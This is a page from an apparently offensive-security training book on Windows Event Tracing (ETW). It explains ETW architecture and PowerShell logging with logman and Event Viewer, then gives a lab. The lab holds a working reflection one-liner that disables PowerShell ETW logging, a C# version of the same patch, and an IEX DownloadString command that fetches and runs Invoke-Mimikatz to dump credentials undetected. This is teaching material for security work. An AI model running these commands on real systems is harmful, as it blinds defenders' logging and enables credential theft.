<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>ETW - </title>
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
                <ol class="chapter"><li class="expanded "><a href="training.html"><strong aria-hidden="true">1.</strong> Training </a></li><li><ol class="section"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.1.</strong> Intro</a></li><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.2.</strong> Havoc C2</a></li><li class="expanded "><a href="privesc.html"><strong aria-hidden="true">1.3.</strong> Privilege Escalation</a></li><li><ol class="section"><li class="expanded "><a href="unquoted.html"><strong aria-hidden="true">1.3.1.</strong> Unquoted Service Path</a></li><li><ol class="section"><li class="expanded "><a href="lab_privesc.html"><strong aria-hidden="true">1.3.1.1.</strong> Lab - PrivEsc</a></li></ol></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.3.2.</strong> UAC Bypass</a></li><li><ol class="section"><li class="expanded "><a href="lab_uac.html"><strong aria-hidden="true">1.3.2.1.</strong> Lab - UAC Bypass</a></li></ol></li><li class="expanded "><a href="stealtoken.html"><strong aria-hidden="true">1.3.3.</strong> Token Manipulation</a></li><li><ol class="section"><li class="expanded "><a href="lab_token.html"><strong aria-hidden="true">1.3.3.1.</strong> Lab - Token theft</a></li><li class="expanded "><a href="lab_tokeninjection.html"><strong aria-hidden="true">1.3.3.2.</strong> Lab - Injection</a></li><li class="expanded "><a href="lab_getsystem.html"><strong aria-hidden="true">1.3.3.3.</strong> Lab - GetSystem</a></li></ol></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.4.</strong> Windows Defender</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.5.</strong> AMSI &amp; CLR</a></li><li><ol class="section"><li class="expanded "><a href="etw.html" class="active"><strong aria-hidden="true">1.5.1.</strong> ETW</a></li><li class="expanded "><a href="lab_powershell.html"><strong aria-hidden="true">1.5.2.</strong> Lab - Powershell</a></li><li class="expanded "><a href="lab_psloader.html"><strong aria-hidden="true">1.5.3.</strong> Lab - PS Loader</a></li></ol></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.6.</strong> Static Analysis</a></li><li><ol class="section"><li class="expanded "><a href="lab_static.html"><strong aria-hidden="true">1.6.1.</strong> Lab Static Analysis</a></li><li class="expanded "><a href="lab_havoc_dotnet.html"><strong aria-hidden="true">1.6.2.</strong> Lab - Havoc dotnet execute</a></li><li class="expanded "><a href="lab_staticforensics.html"><strong aria-hidden="true">1.6.3.</strong> Forensics</a></li></ol></li><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.7.</strong> WIN32api and Functions</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.8.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.8.1.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab_basic.html"><strong aria-hidden="true">1.8.2.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab_shellcodeforensics.html"><strong aria-hidden="true">1.8.3.</strong> Forensics</a></li><li class="expanded "><a href="lab_xor.html"><strong aria-hidden="true">1.8.4.</strong> Lab - XOR Loader</a></li><li class="expanded "><a href="lab_staged.html"><strong aria-hidden="true">1.8.5.</strong> Lab - Remote Loader</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.9.</strong> Forensics</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.9.1.</strong> Malware Analysis Lab</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li><li><ol class="section"><li class="expanded "><a href="frameworks.html"><strong aria-hidden="true">2.1.</strong> Frameworks</a></li><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">2.2.</strong> Heuristics</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">2.3.</strong> Hooks</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">2.4.</strong> Syscalls</a></li><li class="expanded "><a href="kernelcallbacks.html"><strong aria-hidden="true">2.5.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">2.6.</strong> EDR Stuff</a></li><li class="expanded "><a href="privesc_extra.html"><strong aria-hidden="true">2.7.</strong> Additional PrivEsc</a></li><li class="expanded "><a href="havoc_extra.html"><strong aria-hidden="true">2.8.</strong> Additional Havoc</a></li><li class="expanded "><a href="avred.html"><strong aria-hidden="true">2.9.</strong> AVRED</a></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">2.10.</strong> Metasploit Basics</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar" class="menu-bar">
                    <div id="menu-bar-sticky-container">
                        <div class="left-buttons">
                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                                <i class="fa fa-bars"></i>
                            </button>
                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                                <i class="fa fa-paint-brush"></i>
                            </button>
                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                                <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            </ul>
                            
                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                                <i class="fa fa-search"></i>
                            </button>
                            
                        </div>

                        <h1 class="menu-title"></h1>

                        <div class="right-buttons">
                            <a href="print.html" title="Print this book" aria-label="Print this book">
                                <i id="print-button" class="fa fa-print"></i>
                            </a>
                            
                        </div>
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#etw---event-tracing-for-windows-kernel-mode" id="etw---event-tracing-for-windows-kernel-mode">ETW - Event Tracing for Windows (Kernel mode)</a></h1>
<blockquote>
<p><strong>TL;DR</strong> ETW basically is a kernel level debug logging mechanism in Windows - it allows to gather advanced telemetry about functions being called. <code>Windows Event Logs</code> contain a subset of ETW events. Typically used by application developers to debug programs, but has found its way as a telemetry source for <code>EDR's</code>. </p>
</blockquote>
<p>Event Tracing for Windows (ETW) is a high speed tracing facility built into Windows. Using a buffering and logging mechanism implemented in the operating system kernel, ETW provides an infrastructure for events raised by both user mode (apps) and kernel mode components (drivers). ETW can be used for system and app diagnosis, troubleshooting, and performance monitoring.</p>
<p><img src="./images/etwarch.jpg" alt="Screenshot" />
https://learn.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw</p>
<p><em><strong>Provider</strong></em>
A provider is an instrumented component that generates events. A provider can be a user mode app, a kernel mode driver, or the Windows kernel itself. In addition to fixed event data (header), an event can carry user data.</p>
<p>An event is an event-based representation of data. The data can be used for in-depth analysis. An event can also be used to produce counters. Counters provide a sample-based view of data. They typically contain a small set of data to show current state, for example I/O bytes per second and interrupts per second.</p>
<p>A provider must register with ETW and send events by calling the ETW Logging APIs. Providers register a callback function for enable and disable notifications so that tracing can be enabled and disabled dynamically.</p>
<p><em><strong>Session</strong></em>
The ETW session infrastructure works as an intermediate broker that relays the events from one or more providers to the consumer. A session is a kernel object that collects events into kernel buffer and sends them to a specified file or real-time consumer process. Multiple providers can be mapped to a single session, which allows users to collect data from multiple sources.</p>
<p><em><strong>Controller</strong></em>
A controller starts, stops, or updates a trace session. A session is a unit for tracing. Providers are mapped (or enabled) to a specific session. A controller enables and disables providers so that they can start sending events to ETW. Controller functionalities can be invoked with tools provided by Microsoft or you can write your own app.</p>
<p>Logman.exe is an in-box controller app. Windows Performance Recorder (WPR) in the Windows Performance Toolkit is the recommended controller process.</p>
<p><em><strong>Consumer</strong></em>
A consumer is an app that reads a logged trace file (ETL file) or captures events in an active trace session in real time, and processes events. Event Viewer and Resource Monitor are in-box ETW consumer apps.</p>
<p>Windows Performance Analyzer (WPA) in the Windows Performance Toolkit is the recommended consumer process.</p>
<p>To see which ETW providers are running on the system</p>
<pre><code class="language-code">logman query -ets
</code></pre>
<p><img src="./images/etw_logmanets.jpg" alt="Screenshot" /></p>
<p>But there are a lot more ETW providers available:</p>
<p><img src="./images/etw_logmanproviders.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#interesting-etw-providers" id="interesting-etw-providers">Interesting ETW providers</a></h1>
<blockquote>
<ul>
<li>Microsoft-Windows-Kernel-Process</li>
<li>Microsoft-Windows-DotNETRuntime</li>
<li>Microsoft-Windows-Threat-Intelligence</li>
<li>Microsoft-Windows-Defender</li>
<li>Microsoft-Windows-PowerShell</li>
</ul>
</blockquote>
<p>So let's do a deep dive on what ETW can see in powershell by using logman to collect events to PowerShellTrace.etl.</p>
<p>You can search the available ETW providers like this:</p>
<pre><code class="language-powershell">logman  query providers | select-string &quot;powershell&quot;
</code></pre>
<p><img src="./images/etw_logmanqueryps.jpg" alt="Screenshot" /></p>
<p>And get detailed information like this:</p>
<pre><code class="language-powershell">logman query providers Microsoft-Windows-PowerShell
</code></pre>
<p><img src="./images/etw_logmanquery.jpg" alt="Screenshot" /></p>
<p>We'll set up an ETW tracing session for the powershell provider like this:</p>
<pre><code class="language-powershell">logman create trace PowerShellTrace -p Microsoft-Windows-PowerShell -o PowerShellTrace.etl -ets
logman -ets
</code></pre>
<p><img src="./images/etw_logmancreate.jpg" alt="Screenshot" /></p>
<p>This will create an event trace log (.etl file), which we can then convert to txt, csv or even evtx (windows event log format), any commands we run will be collected. In the same powershell console you just ran the create trace command, run some powershell commands:</p>
<pre><code class="language-powershell">$pid
get-process
</code></pre>
<blockquote>
<p><em><strong>IMPORTANT:</strong></em> After running our commands, stop the powershell event trace session and remove it (otherwise this keep collecting logs)</p>
</blockquote>
<pre><code class="language-powershell">logman stop PowerShellTrace -ets
Remove-EtwTraceSession -Name PowerShellTrace
</code></pre>
<p>We have now collected ETW Telemetry on powershell, we could ship this of to an Elastic stack, but for now let's just convert the trace file to an EVTX log that we can view with Windows Eventviewer.</p>
<pre><code class="language-powershell">tracerpt PowerShellTrace.etl -o PowershellTrace.evtx -of evtx -lr
</code></pre>
<p><img src="./images/etw_logmantrace1.jpg" alt="Screenshot" /></p>
<p>Now open Windows Eventviewer and load the saved log by going to <code>ACTION</code> and then <code>SAVED LOG</code>, browse to your PowerShellTrace.evtx file and click <code>OK</code>.:</p>
<p><img src="./images/etw_evt1.jpg" alt="Screenshot" /></p>
<p>We see a whole bunch of logs here, but let's see if we can find the commands we typed ($pid and get-process), by filtering for event ID 4104</p>
<p><img src="./images/etw_evt2.jpg" alt="Screenshot" /></p>
<p>Click on <code>Filter Current Log</code> in the right pane of eventviewer and enter `4104</p>
<p><img src="./images/etw_evt4104.jpg" alt="Screenshot" /></p>
<p>And yes we can find both commands:</p>
<p><img src="./images/etw_evtpid.jpg" alt="Screenshot" /></p>
<p><img src="./images/etw_evtgetproc.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#mini-lab---bypassing-etw-in-powershell" id="mini-lab---bypassing-etw-in-powershell">MINI LAB - BYPASSING ETW in Powershell</a></h1>
<p>run after amsi bypass:</p>
<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
</code></pre>
<p>then run</p>
<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
</code></pre>
<p>No detections, AMSI is disabled, ETW is disabled -&gt; Check eventviewer -&gt; no powershell logs.</p>
<h2><a class="header" href="#understanding-the-components" id="understanding-the-components">Understanding the Components:</a></h2>
<ul>
<li><strong><code>[Reflection.Assembly]::LoadWithPartialName('System.Core')</code>:</strong>
<ul>
<li>Loads the <code>System.Core.dll</code> assembly, containing core .NET classes, including <code>System.Diagnostics.Eventing.EventProvider</code>.</li>
</ul>
</li>
<li><strong><code>.GetType('System.Diagnostics.Eventing.EventProvider')</code>:</strong>
<ul>
<li>Retrieves the <code>System.Diagnostics.Eventing.EventProvider</code> type, responsible for emitting ETW events.</li>
</ul>
</li>
<li><strong><code>.GetField('m_enabled','NonPublic,Instance')</code>:</strong>
<ul>
<li>Retrieves the <code>m_enabled</code> field of the <code>EventProvider</code> class, a non-public instance field that determines whether ETW events are enabled.</li>
</ul>
</li>
<li><strong><code>.SetValue(...)</code>:</strong>
<ul>
<li>Sets the value of the <code>m_enabled</code> field.</li>
</ul>
</li>
<li><strong><code>[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')</code>:</strong>
<ul>
<li>Retrieves the <code>System.Management.Automation.Tracing.PSEtwLogProvider</code> type, a PowerShell-specific wrapper around the .NET ETW functionality.</li>
</ul>
</li>
<li><strong><code>.GetField('etwProvider','NonPublic,Static').GetValue($null)</code>:</strong>
<ul>
<li>Retrieves the <code>etwProvider</code> field of the <code>PSEtwLogProvider</code> class, a non-public static field holding a reference to the <code>EventProvider</code> instance used by PowerShell.</li>
</ul>
</li>
<li><strong><code>,0</code>:</strong>
<ul>
<li>Sets the <code>m_enabled</code> field to <code>0</code> (false), disabling ETW events for the PowerShell <code>EventProvider</code>.</li>
</ul>
</li>
</ul>
<h2><a class="header" href="#how-it-works-etw-bypass" id="how-it-works-etw-bypass">How It Works (ETW Bypass):</a></h2>
<ul>
<li>PowerShell uses the .NET <code>EventProvider</code> class to generate ETW events.</li>
<li>The <code>PSEtwLogProvider</code> class in PowerShell acts as a bridge, holding the specific <code>EventProvider</code> instance used for PowerShell logging.</li>
<li>The <code>m_enabled</code> field within the <code>EventProvider</code> class controls whether events are actually emitted.</li>
<li>By using reflection, the code directly accesses and modifies this internal <code>m_enabled</code> field, setting it to <code>0</code>.</li>
<li>This prevents the PowerShell <code>EventProvider</code> from generating ETW events, effectively bypassing ETW logging for that PowerShell process.</li>
</ul>
<p><img src="./images/etw_diag.jpg" alt="Screenshot" /></p>
<h2><a class="header" href="#key-points" id="key-points">Key Points:</a></h2>
<ul>
<li>This method relies on internal .NET implementation details and might break if those details change in future .NET or PowerShell versions.</li>
<li>It only affects the current PowerShell process.</li>
<li>It is very effective at disabling the ETW logging from within powershell.</li>
<li>This technique is commonly used by malicious actors.</li>
<li>EDR solutions monitor for this type of activity.</li>
</ul>
<p>CSHARP CODE (AI Generated) using the same ETW bypass (also works for .net binaries)</p>
<pre><code class="language-CSharp">using System;
using System.Diagnostics.Eventing;
using System.Reflection;

public class EtwBypass
{
    public static void Main(string[] args)
    {
        try
        {
            // Get the EventProvider type
            Type eventProviderType = typeof(EventProvider);

            // Find the m_enabled field (non-public, instance)
            FieldInfo mEnabledField = eventProviderType.GetField(&quot;m_enabled&quot;, BindingFlags.NonPublic | BindingFlags.Instance);

            // Get the EventProvider instance used by the application (you'll need to adapt this part)
            // This is the tricky part, as you need to find the specific instance you want to patch.
            // In a real application, you would need to find the event provider instance that is used.
            // This example creates a new instance just for demonstration.
            EventProvider dummyProvider = new EventProvider(Guid.NewGuid());

            // Set the m_enabled field to 0 (false)
            if (mEnabledField != null)
            {
                mEnabledField.SetValue(dummyProvider, 0);
                Console.WriteLine(&quot;ETW bypassed.&quot;);
            }
            else
            {
                Console.WriteLine(&quot;m_enabled field not found.&quot;);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
        }
    }
}
</code></pre>
<h2><a class="header" href="#etw-patching-in-net-binaries-vs-powershell" id="etw-patching-in-net-binaries-vs-powershell">ETW Patching in .NET Binaries vs. PowerShell</a></h2>
<p><strong>PowerShell Patch:</strong></p>
<ul>
<li>Uses reflection to modify the <code>PSEtwLogProvider</code> within the PowerShell process.</li>
<li>Specifically targets how PowerShell logs events.</li>
<li>Limited to the PowerShell process.</li>
<li>Executed as a PowerShell command.</li>
<li>Targets the PowerShell ETW logging mechanism.</li>
</ul>
<p><strong>.NET Binary Patch (C# Example):</strong></p>
<ul>
<li>Compiles into a standalone .NET executable.</li>
<li>Uses reflection to directly modify the <code>EventProvider</code> class within the running .NET binary.</li>
<li>Can patch ETW logging for any .NET application that uses the standard .NET <code>EventProvider</code> class, if the correct <code>EventProvider</code> instance can be located.</li>
<li>Can affect any .NET application.</li>
<li>Executed as a compiled executable.</li>
<li>Targets the <code>EventProvider</code> class, allowing it to target any .NET application using that class.</li>
</ul>
<p><strong>Key Differences and Implications:</strong></p>
<ul>
<li><strong>Scope:</strong>
<ul>
<li>PowerShell patch: Limited to the PowerShell process.</li>
<li>.NET binary patch: Can affect any .NET application, if the correct event provider can be located.</li>
</ul>
</li>
<li><strong>Execution Context:</strong>
<ul>
<li>PowerShell patch: Executed as a PowerShell command.</li>
<li>.NET binary patch: Executed as a compiled executable.</li>
</ul>
</li>
<li><strong>Targeting:</strong>
<ul>
<li>Powershell patch: Targets the powershell ETW logging.</li>
<li>.net binary patch: Targets the event provider class, so it can target any .net application that uses that class.</li>
</ul>
</li>
</ul>
<p><strong>In summary:</strong> The C# code provides a more general-purpose ETW patching mechanism that can be used independently of PowerShell, while the PowerShell one-liner is specific to the PowerShell environment.</p>
<hr />
<h1><a class="header" href="#telemetrysourceror" id="telemetrysourceror">TelemetrySourceror</a></h1>
<p>Make sure secure boot is disabled in VM</p>
<pre><code class="language-powershell">bcdedit.exe -set TESTSIGNING ON
</code></pre>
<p>Reboot the machine</p>
<p>Use PSEXEC to run as system and run Telemetry Sourceror</p>
<hr />
<p>ETW USER LAND vs KERNEL MODE</p>
<p><img src="./images/etw_passive.jpg" alt="Screenshot" /></p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                            <a rel="prev" href="amsi.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                        

                        
                            <a rel="next" href="lab_powershell.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                    <a href="amsi.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                

                
                    <a href="lab_powershell.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
                
            </nav>

        </div>

        
        <!-- Livereload script (if served using the cli tool) -->
        <script type="text/javascript">
            var socket = new WebSocket("ws://localhost:3001");
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload(true); // force reload from server (not from cache)
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>
        

        

        
        
        
        <script type="text/javascript">
            window.playpen_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        

    </body>
</html>
